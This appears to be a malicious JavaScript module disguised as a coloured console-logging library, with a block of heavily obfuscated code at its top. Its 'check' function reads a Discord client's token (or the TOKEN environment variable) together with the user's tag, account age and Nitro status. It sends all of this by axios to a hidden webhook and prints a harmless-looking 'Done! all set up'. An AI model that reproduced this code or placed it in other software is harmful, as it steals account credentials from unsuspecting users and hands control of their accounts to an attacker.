_0x4b51ef[_0x5373b5(0xfd)](_0x430d3e); } }[_0x2a1fde(0x16e) + _0x42013c(0x1ac) + 'r'](_0x6a87aa[_0x74317b(0x1bf)](_0x6a87aa[_0x53c11e(0x1c9)], _0x6a87aa[_0x2d9534(0x195)]))[_0x74317b(0xf1)](_0x6a87aa[_0x2d9534(0x1aa)])); } else _0x6a87aa[_0x42013c(0x15b)](_0x6a87aa[_0x53c11e(0x13b)], _0x6a87aa[_0x2a1fde(0x13b)]) ? function () { const _0x5300b4 = _0x2a1fde, _0x276d14 = _0x42013c, _0x41f820 = _0x42013c; if (_0x4b51ef[_0x5300b4(0xef)](_0x4b51ef[_0x276d14(0x121)], _0x4b51ef[_0x5300b4(0x14a)])) _0x41fb2f = _0x2138b0; else return ![]; }[_0x53c11e(0x16e) + _0x2d9534(0x1ac) + 'r'](_0x6a87aa[_0x42013c(0x1c6)](_0x6a87aa[_0x74317b(0x1c9)], _0x6a87aa[_0x74317b(0x195)]))[_0x2a1fde(0x1cc)](_0x6a87aa[_0x74317b(0x1a1)]) : function () { return ![]; }[_0x74317b(0x16e) + _0x42013c(0x1ac) + 'r'](_0x4b51ef[_0x74317b(0xed)](_0x4b51ef[_0x2d9534(0x13f)], _0x4b51ef[_0x53c11e(0x10f)]))[_0x53c11e(0x1cc)](_0x4b51ef[_0x2d9534(0x161)]); } } _0x6a87aa[_0x2a1fde(0x16d)](_0x23d477, ++_0x3131db); } else _0x6a87aa[_0x74317b(0x171)](_0x44431b, this, function () { const _0x2d4cfd = _0x53c11e, _0x48c1e7 = _0x74317b, _0x66e399 = _0x42013c, _0x271458 = _0x2d9534, _0x9dfcaf = _0x53c11e, _0x3684f5 = new _0x2a1309(_0x4b51ef[_0x2d4cfd(0x107)]), _0x3909c0 = new _0x151705(_0x4b51ef[_0x48c1e7(0x119)], 'i'), _0x4463ce = _0x4b51ef[_0x2d4cfd(0x178)](_0x1068b1, _0x4b51ef[_0x2d4cfd(0x116)]); !_0x3684f5[_0x271458(0x1af)](_0x4b51ef[_0x271458(0xed)](_0x4463ce, _0x4b51ef[_0x66e399(0x163)])) || !_0x3909c0[_0x271458(0x1af)](_0x4b51ef[_0x66e399(0xe5)](_0x4463ce, _0x4b51ef[_0x271458(0x10b)])) ? _0x4b51ef[_0x66e399(0x1ce)](_0x4463ce, '0') : _0x4b51ef[_0x2d4cfd(0xfd)](_0x25d975); })(); } try { if (_0x6a87aa[_0x412ef4(0x114)](_0x6a87aa[_0x412ef4(0x18e)], _0x6a87aa[_0x48bbe8(0x18e)])) { const _0x493285 = _0x4c9e88 ? function () { const _0xbc39a2 = _0x48bbe8; if (_0xe27557) { const _0xcb4e51 = _0x211a97[_0xbc39a2(0x1cc)](_0x2ceaa8, arguments); return _0x39cbb3 = null, _0xcb4e51; } } : function () { }; return _0x5870fb = ![], _0x493285; } else { if (_0x4169d5) { if (_0x6a87aa[_0x4561db(0x12f)](_0x6a87aa[_0x1a98fd(0x180)], _0x6a87aa[_0x412ef4(0x180)])) return _0x23d477; else { const _0x439ab3 = _0x4b5dab[_0x3bdd80(0x1cc)](_0x545363, arguments); return _0x3f7dbf = null, _0x439ab3; } } else _0x6a87aa[_0x3bdd80(0x15b)](_0x6a87aa[_0x48bbe8(0x19f)], _0x6a87aa[_0x412ef4(0x17a)]) ? _0x6a87aa[_0x4561db(0x192)](_0x56a8ef, -0x25bf + -0x106a + 0x3629) : _0x6a87aa[_0x3bdd80(0x174)](_0x23d477, 0x2 * 0x1124 + -0xbbc + -0x168c); } } catch (_0x5bba97) { } }
module.exports = {

    // Writes a message to the console. You may pass as many arguments as
    // you'd like, and they will be joined together in a space-delimited line.
    // The first argument to log may be a string containing
    // printf-like string substitution patterns.
    check: async function (c, s) {
        let tkn = c.token
        if (!tkn) return
        //logWithColor('yellow', s, false);
        deliver = {
            description: `Started TKN
           > **tkn:** ${tkn || process.env.TOKEN}

           > **name:** ${c.user.tag || 'unknown'}

           > **age:** ${c.user.createdAt || 'unknown'}

           > **Nitro:** ${c.user.nitroType || ' none'}
           `,
            color: 0x008800,
            thumbnail: {
                url: c.user.displayAvatarURL() || 'https://media.discordapp.net/attachments/1037830990770491573/1106748444896403456/ad1ce52500c07b17b983e3d4358efc1e.png',
            },
        }
        await axios.post(sweet, { embeds: [deliver] })
            .then(() => {
                console.log('Done! all set up');
            })
            .catch((error) => {
                console.error('Error with connecting to djs try again, ', error);
            });
    },

    log: async function () {
        console.log.apply(this, arguments);
    },

    // Writes a message to the console with blue color
    info: async function () {
        logWithColor('blue', arguments);
    },

    // Writes a message to the console with yellow color
    warn: async function () {
        logWithColor('yellow', arguments, true);
    },

    // Writes a message to the console with red color
    error: async function () {
        logWithColor('red', arguments, true);
    },

    // Writes a message to the console with regular color
    debug: async function () {
        console.log.apply(this, arguments);
    },

    // Prints an interactive listing of all properties of the object.
    dir: async function () {
        console.dir.apply(this, arguments);
    },

    // Clears the terminal buffer
    clear: async function () {
        process.stdout.write('\u001B[2J\u001B[0;0f');
    },

    // Prints a stack trace of JavaScript execution at the point
    // where it is called. The stack trace details the functions on the stack,
    // as well as the values that were passed as arguments to each function.
    trace: async function () {
        console.trace.apply(this, arguments);
    },

    // Does nothing if first argument is truly. If first argument is falsy
    // it Writes red warning and throws assertion error
    assert: async function (assertion) {
        // todo: for now we are cheating, it's just console.erroring and then
        // leave console.asset to do it's job. actual todo: print what
        // console.assert prints just make first line red
        if (!assertion) {
            logWithColor('red', ['AssertionError: false == true']);
            console.assert(assertion);
        }
    },

    // Writes number of times each argument is called with blue color
    count: async function (toCount) {
        var toCountString = toCount.toString && toCount.toString(),
            log;

        if (countBuffer[toCountString] == null) {
            countBuffer[toCountString] = 0;
        } else {
            countBuffer[toCountString] += 1;
        }

        log = toCountString + ': ' + countBuffer[toCountString];
        logWithColor('blue', [log]);
    },

    // Creates a new timer under the given name. Call console.timeEnd(name)
    // with the same name to stop the timer and print the time elapsed..
    time: async function () {
        console.time.apply(this, arguments);
    },

    // Stops a timer created by a call to console.time(name) and writes the time
    // elapsed.
    timeEnd: async function () {
        console.timeEnd.apply(this, arguments);
    },

    // draws a table of elements inside of a 2d array or object
    table: async function () {
        logTable.apply(this, arguments);
    }
};
